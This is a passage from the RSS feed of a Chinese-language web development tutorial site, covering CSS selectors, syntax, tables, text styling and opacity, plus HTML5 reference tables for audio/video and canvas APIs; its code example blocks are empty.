<p><strong>类选择器</strong> 选择有特定 <strong>class 属性</strong> 的 HTML 元素。</p>
<p>选择拥有特定 <code>class</code> 的元素，请写一个句点（<code>.</code>）字符，后面跟类名。例如：</p>

<p>还可以指定只有特定的 HTML 元素会受类的影响。例如：</p>
<p>下面只有具有 <code>class="center"</code> 的 <code>&lt;p&gt;</code> 元素会居中对齐。</p>

<p>HTML 元素也可以引用多个类。例如：</p>
<p>下面 <code>&lt;p&gt;</code> 元素将根据 <code>class="center"</code> 和 <code>class="large"</code> 进行样式设置。</p>

<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>类名不能以数字开头</p>
</div>
<h2> CSS 通用选择器</h2>
<p>通用选择器（<code>*</code>）选择页面上的所有的 HTML 元素。例如：</p>
<p>下面的 CSS 规则会影响页面上的每个 HTML 元素。</p>

<h2> CSS 分组选择器</h2>
<p>分组选择器选取所有具有相同样式定义的 HTML 元素。例如：</p>
<p>下面的 CSS 代码（<code>h1</code>、<code>h2</code> 和 <code>p</code> 元素具有 <strong>相同</strong> 的样式定义）。</p>
<div class="language-css line-numbers-mode" data-ext="css"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最好对选择器进行分组，以最大程度地 <strong>缩减代码。</strong></p>
<p>如需对选择器进行分组，请用 <strong>逗号</strong> 来分隔每个选择器。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>语法</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/syntax.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/syntax.html</guid>
      <source url="https://sankgao.github.io/rss.xml">语法</source>
      <description>CSS 规则集（rule-set）由选择器和声明块组成： 选择器：指向您需要设置样式的 HTML 元素; 声明块：包含一条或多条用 分号 分隔的声明; 每条声明都包含一个 CSS 属性名称 和 一个值，以冒号分隔; 多条 CSS 声明用分号分隔，声明块用 花括号 括起来; 例如：所有 元素都将居中对齐，并带有红色文本颜色。 演示 p 是 CSS 中的选...</description>
      <category>Frontend</category>
      <pubDate>Mon, 15 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>CSS 规则集（rule-set）由选择器和声明块组成：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>选择器</strong>：指向您需要设置样式的 HTML 元素</li>
<li><strong>声明块</strong>：包含一条或多条用 <strong>分号</strong> 分隔的声明</li>
<li>每条声明都包含一个 CSS <strong>属性名称</strong> 和 <strong>一个值</strong>，以冒号分隔</li>
<li>多条 CSS 声明用分号分隔，声明块用 <strong>花括号</strong> 括起来</li>
</ul>
<p>例如：所有 <code>&lt;p&gt;</code> 元素都将居中对齐，并带有红色文本颜色。</p>

<ul>
<li><code>p</code> 是 CSS 中的选择器（它指向要设置样式的 HTML 元素：<code>&lt;p&gt;</code>）</li>
<li><code>color</code> 是属性，<code>red</code> 是属性值</li>
<li><code>text-align</code> 是属性，<code>center</code> 是属性值</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>表格</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/table.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/table.html</guid>
      <source url="https://sankgao.github.io/rss.xml">表格</source>
      <description>使用 CSS 可以极大地改善 HTML 表格的外观。例如： 演示 表格边框 如需在 CSS 中设置表格边框，请使用 border 属性。 例如：为 、`` 和 元素规定了黑色边框。 演示 全宽表格 上表似乎很小。如果您需要一个可以覆盖整个屏幕（全宽）的表格，请为 元素添加 width: 100%。例如： 演示 上例中的表格拥有双边框。这是因为 tabl...</description>
      <category>Frontend</category>
      <pubDate>Wed, 17 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>使用 CSS 可以极大地改善 HTML 表格的外观。例如：</p>

<h2> 表格边框</h2>
<p>如需在 CSS 中设置表格边框，请使用 <code>border</code> 属性。</p>
<p>例如：为 <code>&lt;table&gt;</code>、<code>&lt;th&gt;</code> 和 <code>&lt;td&gt;</code> 元素规定了黑色边框。</p>

<h2> 全宽表格</h2>
<p>上表似乎很小。如果您需要一个可以覆盖整个屏幕（全宽）的表格，请为 <code>&lt;table&gt;</code> 元素添加 <code>width: 100%</code>。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>上例中的表格拥有双边框。这是因为 <code>table</code> 和 <code>&lt;th&gt;</code> 和 <code>&lt;td&gt;</code> 元素都有单独的边框</p>
</div>
<h2> 合并表格边框</h2>
<p><code>border-collapse</code> 属性设置是否将表格边框折叠为单一边框。例如：</p>

<p>如果只希望表格周围有边框，则仅需为 <code>&lt;table&gt;</code> 指定 <code>border</code> 属性。例如：</p>

<h2> 表格宽度和高度</h2>
<p>表格的宽度和高度由 <code>width</code> 和 <code>height</code> 属性定义。</p>
<p>例如：将表的宽度设置为 <code>100%</code>，将 <code>&lt;th&gt;</code> 元素的高度设置为 <code>50px</code>。</p>

<p>要创建仅占页面一半的表，请使用 <code>width: 50%</code>。例如：</p>

<h2> 水平对齐</h2>
<p><code>text-align</code> 属性设置 <code>&lt;th&gt;</code> 或 <code>&lt;td&gt;</code> 中内容的水平对齐方式（左、右或居中）。</p>
<ul>
<li><strong>left</strong>：水平左对齐</li>
<li><strong>right</strong>：水平右对齐</li>
<li><strong>center</strong>：水平居中对齐</li>
</ul>
<p>默认情况下，<code>&lt;th&gt;</code> 元素的内容居中对齐，而 <code>&lt;td&gt;</code> 元素的内容左对齐。</p>
<p>要使 <code>&lt;td&gt;</code> 元素的内容也居中对齐，请使用 <code>text-align: center</code>。例如：</p>

<h2> 垂直对齐</h2>
<p><code>vertical-align</code> 属性设置 <code>&lt;th&gt;</code> 或 <code>&lt;td&gt;</code> 中内容的垂直对齐方式（上、下或居中）。</p>
<ul>
<li><strong>top</strong>：垂直上对齐</li>
<li><strong>bottom</strong>：垂直下对齐</li>
<li><strong>middle</strong>：垂直居中对齐</li>
</ul>
<p>默认情况下，表中内容的垂直对齐是居中（<code>&lt;th&gt;</code> 和 <code>&lt;td&gt;</code> 元素都是）。</p>
<p>例如：将 <code>&lt;td&gt;</code> 元素的垂直文本对齐方式设置为下对齐。</p>

<h2> 表格内边距</h2>
<p>如需控制边框和表格内容之间的间距，请在 <code>&lt;td&gt;</code> 和 <code>&lt;th&gt;</code> 元素上使用 <code>padding</code> 属性。例如：</p>

<h2> 水平分隔线</h2>
<p>向 <code>&lt;th&gt;</code> 和 <code>&lt;td&gt;</code> 添加 <code>border-bottom</code> 属性，以实现水平分隔线。例如：</p>

<h2> 可悬停表格</h2>
<p>在 <code>&lt;tr&gt;</code> 元素上使用 <code>:hover</code> 选择器，以突出显示鼠标悬停时的表格行。例如：</p>

<h2> 条状表格</h2>
<p>为了实现斑马纹表格效果，请使用 <code>nth-child()</code> 选择器，并为所有偶数（或奇数）表行添加 <code>background-color</code>。例如：</p>

<h2> 表格颜色</h2>
<p>指定 <code>&lt;th&gt;</code> 元素的背景颜色和文本颜色。例如：</p>

<h2> 响应式表格</h2>
<p>如果屏幕太小而无法显示全部内容，则响应式表格会显示水平滚动条。</p>
<p>在 <code>&lt;table&gt;</code> 元素周围添加带有 <code>overflow-x: auto</code> 的容器元素（例如 <code>&lt;div&gt;</code>），以实现响应式效果。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>文本</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/text.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/text.html</guid>
      <source url="https://sankgao.github.io/rss.xml">文本</source>
      <description>文本颜色 color 属性用于设置文本的颜色。颜色由以下值指定： name：指定颜色名。比如：red; HEX：指定十六进制。比如：#ff0000; RGB：指定 RGB 值。比如：rgb(255,0,0); 页面的默认文本颜色是在 body 选择器中定义的。例如： 演示 文本颜色和背景色 对于 W3C compliant CSS：如果您定义了 col...</description>
      <category>Frontend</category>
      <pubDate>Tue, 16 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 文本颜色</h2>
<p><code>color</code> 属性用于设置文本的颜色。颜色由以下值指定：</p>
<ul>
<li><strong>name</strong>：指定颜色名。比如：<code>red</code></li>
<li><strong>HEX</strong>：指定十六进制。比如：<code>#ff0000</code></li>
<li><strong>RGB</strong>：指定 RGB 值。比如：<code>rgb(255,0,0)</code></li>
</ul>
<p>页面的默认文本颜色是在 body 选择器中定义的。例如：</p>

<h3> 文本颜色和背景色</h3>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>对于 W3C compliant CSS：如果您定义了 <code>color</code> 属性，则还必须定义 <code>background-color</code> 属性</p>
</div>
<p>例如：</p>

<h2> 文本对齐</h2>
<p><code>text-align</code> 属性用于设置文本的水平对齐方式。</p>
<p>如果文本方向是从左到右，则默认为左对齐；如果文本方向是从右到左，则默认是右对齐。</p>
<p>文本可以 <strong>左对齐</strong>、<strong>右对齐</strong>、<strong>居中对齐</strong>。例如：</p>

<p>当 <code>text-align</code> 属性设置为 <code>justify</code> 后，将拉伸每一行，以使每一行具有相等的宽度，并且左右边距是直的（就像在杂志和报纸中）。例如：</p>

<h3> 文本方向</h3>
<p><code>direction</code> 和 <code>unicode-bidi</code> 属性可用于更改元素的文本方向。例如：</p>

<ul>
<li>
<p><strong>direction</strong>：属性规定文本的书写方向</p>
<ul>
<li><strong>rtl</strong>：文本方向从右到左</li>
</ul>
</li>
<li>
<p><strong>unicode-bidi</strong>：属性是否应重写文本</p>
<ul>
<li><strong>bidi-override</strong>：对于行内元素，该值会创建一个覆盖；对于块容器元素，该值将为不在另一个块容器元素内的行内级别的后代创建一个覆盖</li>
</ul>
</li>
</ul>
<h3> 垂直对齐</h3>
<p><code>vertical-align</code> 属性设置元素的垂直对齐方式。</p>
<p>例如：设置文本中图像的垂直对齐方式。</p>

<h2> 文字装饰</h2>
<p><code>text-decoration</code> 属性用于设置或删除文本装饰。</p>
<p><code>text-decoration: none;</code> 通常用于从链接上删除下划线。例如：</p>

<p>其他 <code>text-decoration</code> 值用于装饰文本。例如：</p>

<ul>
<li><strong>overline</strong>：上划线</li>
<li><strong>line-through</strong>：划线</li>
<li><strong>underline</strong>：下划线</li>
</ul>
<h2> 文本转换</h2>
<p><code>text-transform</code> 属性用于指定文本中的大写和小写字母。</p>
<p>用于将所有内容转换为大写或小写字母，或将每个单词的首字母大写。例如：</p>

<ul>
<li><strong>uppercase</strong>：定义全部转换为大写字母</li>
<li><strong>lowercase</strong>：定义全部转换为小写字母</li>
<li><strong>capitalize</strong>：定义全部转换为首字母大写</li>
</ul>
<h2> 文字间距</h2>
<h3> 文字缩进</h3>
<p><code>text-indent</code> 属性用于指定文本第一行的缩进。例如：</p>

<h3> 字母间距</h3>
<p><code>letter-spacing</code> 属性用于指定文本中字符之间的间距。例如：</p>

<h3> 行高</h3>
<p><code>line-height</code> 属性用于指定行之间的间距。例如：</p>

<h3> 字间距</h3>
<p><code>word-spacing</code> 属性用于指定文本中单词之间的间距。例如：</p>

<h3> 空白</h3>
<p><code>white-space</code> 属性指定元素内部空白的处理方式。</p>
<p>例如：禁用元素内的文本换行。</p>

<h2> 文本阴影</h2>
<p><code>text-shadow</code> 属性为文本添加阴影。</p>
<p>最简单的用法是只指定水平阴影（2px）和垂直阴影（2px）。例如：</p>

<p>向阴影添加颜色（红色）。例如：</p>

<p>向阴影添加模糊效果（5px）。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>透明度</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/transparency.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/transparency.html</guid>
      <source url="https://sankgao.github.io/rss.xml">透明度</source>
      <description>opacity 属性指定元素的透明度。 透明图像 opacity 属性的取值范围为 0.0-1.0。值越低，越透明。例如： 演示 透明悬停效果 opacity 属性通常与 :hover 选择器一同使用，这样就可以在鼠标悬停时更改不透明度。例如： 演示 透明盒 使用 opacity 属性为元素的背景添加透明度时，其所有子元素都继承相同的透明度。这可能会使...</description>
      <category>Frontend</category>
      <pubDate>Fri, 19 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p><code>opacity</code> 属性指定元素的透明度。</p>
<h2> 透明图像</h2>
<p><code>opacity</code> 属性的取值范围为 <code>0.0-1.0</code>。值越低，越透明。例如：</p>

<h2> 透明悬停效果</h2>
<p><code>opacity</code> 属性通常与 <code>:hover</code> 选择器一同使用，这样就可以在鼠标悬停时更改不透明度。例如：</p>

<h2> 透明盒</h2>
<p>使用 <code>opacity</code> 属性为元素的背景添加透明度时，其所有子元素都继承相同的透明度。这可能会使完全透明的元素内的文本难以阅读。例如：</p>

<h2> 使用 RGBA 的透明度</h2>
<p>如果您不希望对子元素应用不透明度，请使用 <code>RGBA</code> 颜色值。</p>
<p>例如：设置背景色而不是文本的不透明度。</p>

<h2> 透明盒中的文本</h2>
<p>首先，创建一个带有背景图像和边框的 <code>&lt;div&gt;</code> 元素（class="background"）。</p>
<p>然后，在第一个 <code>&lt;div&gt;</code> 中创建另一个 <code>&lt;div&gt;</code>（class="transbox"）。</p>
<p><code>&lt;div class="transbox"&gt;</code> 有背景色和边框，这个 div 是透明的。</p>
<p>在透明的 <code>&lt;div&gt;</code> 内，并在 <code>&lt;p&gt;</code> 元素内添加了一些文本。</p>
<p>例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>参考手册</title>
      <link>https://sankgao.github.io/languages/html5/references/</link>
      <guid>https://sankgao.github.io/languages/html5/references/</guid>
      <source url="https://sankgao.github.io/rss.xml">参考手册</source>
      <description>记录一些 HTML5 参考手册相关的信息。</description>
      <category>Languages</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 HTML5 参考手册相关的信息。</p>
<!-- more -->
<h2> 参考手册</h2>
<ul>
<li><a href="/languages/html5/references/tags.html" target="blank">标签元素</a></li>
<li><a href="/languages/html5/references/global_attribute.html" target="blank">全局属性</a></li>
<li><a href="/languages/html5/references/global_event.html" target="blank">全局事件</a></li>
<li><a href="/languages/html5/references/colornames.html" target="blank">颜色名称</a></li>
<li><a href="/languages/html5/references/canvas.html" target="blank">Canvas 画布</a></li>
<li><a href="/languages/html5/references/audio_video.html" target="blank">音频/视频</a></li>
<li><a href="/languages/html5/references/charactersets.html" target="blank">字符集</a></li>
<li><a href="/languages/html5/references/urlencode.html" target="blank">URL 编码</a></li>
<li><a href="/languages/html5/references/language_codes.html" target="blank">语言代码</a></li>
<li><a href="/languages/html5/references/country_codes.html" target="blank">国家/地区代码</a></li>
<li><a href="/languages/html5/references/status_messages.html" target="blank">状态消息</a></li>
<li><a href="/languages/html5/references/methods.html" target="blank">请求方法</a></li>
<li><a href="/languages/html5/references/shortcuts.html" target="blank">键盘快捷键</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>音频/视频</title>
      <link>https://sankgao.github.io/languages/html5/references/audio_video.html</link>
      <guid>https://sankgao.github.io/languages/html5/references/audio_video.html</guid>
      <source url="https://sankgao.github.io/rss.xml">音频/视频</source>
      <description>HTML5 为 和 元素提供了方法、属性和事件。 这些方法、属性和事件允许您使用 JavaScript 来操作 和 元素。 HTML5 Audio/Video 方法 方法 描述 :----: :---- addTextTrack() 向音频/视频添加新的文本轨道 canPlayType() 检测浏览器是否能播放指定的音频/视频类型 load() 重新加...</description>
      <category>Frontend</category>
      <pubDate>Fri, 12 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>HTML5 为 <code>&lt;audio&gt;</code> 和 <code>&lt;video&gt;</code> 元素提供了方法、属性和事件。</p>
<p>这些方法、属性和事件允许您使用 JavaScript 来操作 <code>&lt;audio&gt;</code> 和 <code>&lt;video&gt;</code> 元素。</p>
<h2> HTML5 Audio/Video 方法</h2>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">addTextTrack()</td>
<td style="text-align:left">向音频/视频添加新的文本轨道</td>
</tr>
<tr>
<td style="text-align:center">canPlayType()</td>
<td style="text-align:left">检测浏览器是否能播放指定的音频/视频类型</td>
</tr>
<tr>
<td style="text-align:center">load()</td>
<td style="text-align:left">重新加载音频/视频元素</td>
</tr>
<tr>
<td style="text-align:center">play()</td>
<td style="text-align:left">开始播放音频/视频</td>
</tr>
<tr>
<td style="text-align:center">pause()</td>
<td style="text-align:left">暂停当前播放的音频/视频</td>
</tr>
</tbody>
</table>
<h2> HTML5 Audio/Video 属性</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">audioTracks</td>
<td style="text-align:left">返回表示可用音轨的 AudioTrackList 对象</td>
</tr>
<tr>
<td style="text-align:center">autoplay</td>
<td style="text-align:left">设置或返回是否在加载完成后随即播放音频/视频</td>
</tr>
<tr>
<td style="text-align:center">buffered</td>
<td style="text-align:left">返回表示音频/视频已缓冲部分的 TimeRanges 对象</td>
</tr>
<tr>
<td style="text-align:center">controller</td>
<td style="text-align:left">返回表示音频/视频当前媒体控制器的 MediaController 对象</td>
</tr>
<tr>
<td style="text-align:center">controls</td>
<td style="text-align:left">设置或返回音频/视频是否显示控件（比如播放/暂停等）</td>
</tr>
<tr>
<td style="text-align:center">crossOrigin</td>
<td style="text-align:left">设置或返回音频/视频的 CORS 设置</td>
</tr>
<tr>
<td style="text-align:center">currentSrc</td>
<td style="text-align:left">返回当前音频/视频的 URL</td>
</tr>
<tr>
<td style="text-align:center">currentTime</td>
<td style="text-align:left">设置或返回音频/视频中的当前播放位置（以秒计）</td>
</tr>
<tr>
<td style="text-align:center">defaultMuted</td>
<td style="text-align:left">设置或返回音频/视频默认是否静音</td>
</tr>
<tr>
<td style="text-align:center">defaultPlaybackRate</td>
<td style="text-align:left">设置或返回音频/视频的默认播放速度</td>
</tr>
<tr>
<td style="text-align:center">duration</td>
<td style="text-align:left">返回当前音频/视频的长度（以秒计）</td>
</tr>
<tr>
<td style="text-align:center">ended</td>
<td style="text-align:left">返回音频/视频的播放是否已结束</td>
</tr>
<tr>
<td style="text-align:center">error</td>
<td style="text-align:left">返回表示音频/视频错误状态的 MediaError 对象</td>
</tr>
<tr>
<td style="text-align:center">loop</td>
<td style="text-align:left">设置或返回音频/视频是否应在结束时重新播放</td>
</tr>
<tr>
<td style="text-align:center">mediaGroup</td>
<td style="text-align:left">设置或返回音频/视频所属的组合（用于连接多个音频/视频元素）</td>
</tr>
<tr>
<td style="text-align:center">muted</td>
<td style="text-align:left">设置或返回音频/视频是否静音</td>
</tr>
<tr>
<td style="text-align:center">networkState</td>
<td style="text-align:left">返回音频/视频的当前网络状态</td>
</tr>
<tr>
<td style="text-align:center">paused</td>
<td style="text-align:left">设置或返回音频/视频是否暂停</td>
</tr>
<tr>
<td style="text-align:center">playbackRate</td>
<td style="text-align:left">设置或返回音频/视频播放的速度</td>
</tr>
<tr>
<td style="text-align:center">played</td>
<td style="text-align:left">返回表示音频/视频已播放部分的 TimeRanges 对象</td>
</tr>
<tr>
<td style="text-align:center">preload</td>
<td style="text-align:left">设置或返回音频/视频是否应该在页面加载后进行加载</td>
</tr>
<tr>
<td style="text-align:center">readyState</td>
<td style="text-align:left">返回音频/视频当前的就绪状态</td>
</tr>
<tr>
<td style="text-align:center">seekable</td>
<td style="text-align:left">返回表示音频/视频可寻址部分的 TimeRanges 对象</td>
</tr>
<tr>
<td style="text-align:center">seeking</td>
<td style="text-align:left">返回用户是否正在音频/视频中进行查找</td>
</tr>
<tr>
<td style="text-align:center">src</td>
<td style="text-align:left">设置或返回音频/视频元素的当前来源</td>
</tr>
<tr>
<td style="text-align:center">startDate</td>
<td style="text-align:left">返回表示当前时间偏移的 Date 对象</td>
</tr>
<tr>
<td style="text-align:center">textTracks</td>
<td style="text-align:left">返回表示可用文本轨道的 TextTrackList 对象</td>
</tr>
<tr>
<td style="text-align:center">videoTracks</td>
<td style="text-align:left">返回表示可用视频轨道的 VideoTrackList 对象</td>
</tr>
<tr>
<td style="text-align:center">volume</td>
<td style="text-align:left">设置或返回音频/视频的音量</td>
</tr>
</tbody>
</table>
<h2> HTML5 Audio/Video 事件</h2>
<table>
<thead>
<tr>
<th style="text-align:center">事件</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">abort</td>
<td style="text-align:left">当音频/视频的加载已放弃时</td>
</tr>
<tr>
<td style="text-align:center">canplay</td>
<td style="text-align:left">当浏览器可以播放音频/视频时</td>
</tr>
<tr>
<td style="text-align:center">canplaythrough</td>
<td style="text-align:left">当浏览器可在不因缓冲而停顿的情况下进行播放时</td>
</tr>
<tr>
<td style="text-align:center">durationchange</td>
<td style="text-align:left">当音频/视频的时长已更改时</td>
</tr>
<tr>
<td style="text-align:center">emptied</td>
<td style="text-align:left">当目前的播放列表为空时</td>
</tr>
<tr>
<td style="text-align:center">ended</td>
<td style="text-align:left">当目前的播放列表已结束时</td>
</tr>
<tr>
<td style="text-align:center">error</td>
<td style="text-align:left">当在音频/视频加载期间发生错误时</td>
</tr>
<tr>
<td style="text-align:center">loadeddata</td>
<td style="text-align:left">当浏览器已加载音频/视频的当前帧时</td>
</tr>
<tr>
<td style="text-align:center">loadedmetadata</td>
<td style="text-align:left">当浏览器已加载音频/视频的元数据时</td>
</tr>
<tr>
<td style="text-align:center">loadstart</td>
<td style="text-align:left">当浏览器开始查找音频/视频时</td>
</tr>
<tr>
<td style="text-align:center">pause</td>
<td style="text-align:left">当音频/视频已暂停时</td>
</tr>
<tr>
<td style="text-align:center">play</td>
<td style="text-align:left">当音频/视频已开始或不再暂停时</td>
</tr>
<tr>
<td style="text-align:center">playing</td>
<td style="text-align:left">当音频/视频在已因缓冲而暂停或停止后已就绪时</td>
</tr>
<tr>
<td style="text-align:center">progress</td>
<td style="text-align:left">当浏览器正在下载音频/视频时</td>
</tr>
<tr>
<td style="text-align:center">ratechange</td>
<td style="text-align:left">当音频/视频的播放速度已更改时</td>
</tr>
<tr>
<td style="text-align:center">seeked</td>
<td style="text-align:left">当用户已移动/跳跃到音频/视频中的新位置时</td>
</tr>
<tr>
<td style="text-align:center">seeking</td>
<td style="text-align:left">当用户开始移动/跳跃到音频/视频中的新位置时</td>
</tr>
<tr>
<td style="text-align:center">stalled</td>
<td style="text-align:left">当浏览器尝试获取媒体数据，但数据不可用时</td>
</tr>
<tr>
<td style="text-align:center">suspend</td>
<td style="text-align:left">当浏览器刻意不获取媒体数据时</td>
</tr>
<tr>
<td style="text-align:center">timeupdate</td>
<td style="text-align:left">当目前的播放位置已更改时</td>
</tr>
<tr>
<td style="text-align:center">volumechange</td>
<td style="text-align:left">当音量已更改时</td>
</tr>
<tr>
<td style="text-align:center">waiting</td>
<td style="text-align:left">当视频由于需要缓冲下一帧而停止</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>Canvas 画布</title>
      <link>https://sankgao.github.io/languages/html5/references/canvas.html</link>
      <guid>https://sankgao.github.io/languages/html5/references/canvas.html</guid>
      <source url="https://sankgao.github.io/rss.xml">Canvas 画布</source>
      <description>HTML 标签用于通过脚本（通常是 JavaScript）动态绘制图形。 颜色、样式和阴影 属性 描述 :----: :---- fillStyle 设置或返回用于填充绘画的颜色、渐变或模式 strokeStyle 设置或返回用于笔触的颜色、渐变或模式 shadowColor 设置或返回用于阴影的颜色 shadowBlur 设置或返回用于阴影的模糊级别...</description>
      <category>Frontend</category>
      <pubDate>Fri, 12 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>HTML <code>&lt;canvas&gt;</code> 标签用于通过脚本（通常是 JavaScript）动态绘制图形。</p>
<h2> 颜色、样式和阴影</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">fillStyle</td>
<td style="text-align:left">设置或返回用于填充绘画的颜色、渐变或模式</td>
</tr>
<tr>
<td style="text-align:center">strokeStyle</td>
<td style="text-align:left">设置或返回用于笔触的颜色、渐变或模式</td>
</tr>
<tr>
<td style="text-align:center">shadowColor</td>
<td style="text-align:left">设置或返回用于阴影的颜色</td>
</tr>
<tr>
<td style="text-align:center">shadowBlur</td>
<td style="text-align:left">设置或返回用于阴影的模糊级别</td>
</tr>
<tr>
<td style="text-align:center">shadowOffsetX</td>
<td style="text-align:left">设置或返回阴影距形状的水平距离</td>
</tr>
<tr>
<td style="text-align:center">shadowOffsetY</td>
<td style="text-align:left">设置或返回阴影距形状的垂直距离</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">createLinearGradient()</td>
<td style="text-align:left">创建线性渐变（用在画布内容上）</td>
</tr>
<tr>
<td style="text-align:center">createPattern()</td>
<td style="text-align:left">在指定的方向上重复指定的元素</td>
</tr>
<tr>
<td style="text-align:center">createRadialGradient()</td>
<td style="text-align:left">创建放射状或环形的渐变（用在画布内容上）</td>
</tr>
<tr>
<td style="text-align:center">addColorStop()</td>
<td style="text-align:left">规定渐变对象中的颜色和停止位置</td>
</tr>
</tbody>
</table>
<h2> 线条样式</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">lineCap</td>
<td style="text-align:left">设置或返回线条的结束端点样式</td>
</tr>
<tr>
<td style="text-align:center">lineJoin</td>
<td style="text-align:left">设置或返回两条线相交时，所创建的拐角类型</td>
</tr>
<tr>
<td style="text-align:center">lineWidth</td>
<td style="text-align:left">设置或返回当前的线条宽度</td>
</tr>
<tr>
<td style="text-align:center">miterLimit</td>
<td style="text-align:left">设置或返回最大斜接长度</td>
</tr>
</tbody>
</table>
<h2> 矩形</h2>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">rect()</td>
<td style="text-align:left">创建矩形</td>
</tr>
<tr>
<td style="text-align:center">fillRect()</td>
<td style="text-align:left">绘制 “被填充” 的矩形</td>
</tr>
<tr>
<td style="text-align:center">strokeRect()</td>
<td style="text-align:left">绘制矩形（无填充）</td>
</tr>
<tr>
<td style="text-align:center">clearRect()</td>
<td style="text-align:left">在给定的矩形内清除指定的像素</td>
</tr>
</tbody>
</table>
<h2> 路径</h2>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">fill()</td>
<td style="text-align:left">填充当前绘图（路径）</td>
</tr>
<tr>
<td style="text-align:center">stroke()</td>
<td style="text-align:left">绘制已定义的路径</td>
</tr>
<tr>
<td style="text-align:center">beginPath()</td>
<td style="text-align:left">起始一条路径，或重置当前路径</td>
</tr>
<tr>
<td style="text-align:center">moveTo()</td>
<td style="text-align:left">把路径移动到画布中的指定点，不创建线条</td>
</tr>
<tr>
<td style="text-align:center">closePath()</td>
<td style="text-align:left">创建从当前点回到起始点的路径</td>
</tr>
<tr>
<td style="text-align:center">lineTo()</td>
<td style="text-align:left">添加一个新点，然后在画布中创建从该点到最后指定点的线条</td>
</tr>
<tr>
<td style="text-align:center">clip()</td>
<td style="text-align:left">从原始画布剪切任意形状和尺寸的区域</td>
</tr>
<tr>
<td style="text-align:center">quadraticCurveTo()</td>
<td style="text-align:left">创建二次贝塞尔曲线</td>
</tr>
<tr>
<td style="text-align:center">bezierCurveTo()</td>
<td style="text-align:left">创建三次方贝塞尔曲线</td>
</tr>
<tr>
<td style="text-align:center">arc()</td>
<td style="text-align:left">创建弧或曲线（用于创建圆形或部分圆）</td>
</tr>
<tr>
<td style="text-align:center">arcTo()</td>
<td style="text-align:left">创建两切线之间的弧或曲线</td>
</tr>
<tr>
<td style="text-align:center">isPointInPath()</td>
<td style="text-align:left">如果指定的点位于当前路径中，则返回 true，否则返回 false</td>
</tr>
</tbody>
</table>
<h2> 转换</h2>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">scale()</td>
<td style="text-align:left">缩放当前绘图至更大或更小</td>
</tr>
<tr>
<td style="text-align:center">rotate()</td>
<td style="text-align:left">旋转当前绘图</td>
</tr>
<tr>
<td style="text-align:center">translate()</td>
<td style="text-align:left">重新映射画布上的（<code>0,0</code>）位置</td>
</tr>
<tr>
<td style="text-align:center">transform()</td>
<td style="text-align:left">替换绘图的当前转换矩阵</td>
</tr>
<tr>
<td style="text-align:center">setTransform()</td>
<td style="text-align:left">将当前转换重置为单位矩阵。然后运行 transform()</td>
</tr>
</tbody>
</table>
<h2> 文本</h2>
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">font</td>
<td style="text-align:left">设置或返回文本内容的当前字体属性</td>
</tr>
<tr>
<td style="text-align:center">textAlign</td>
<td style="text-align:left">设置或返回文本内容的当前对齐方式</td>
</tr>
<tr>
<td style="text-align:center">textBaseline</td>
<td style="text-align:left">设置或返回在绘制文本时使用的当前文本基线</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
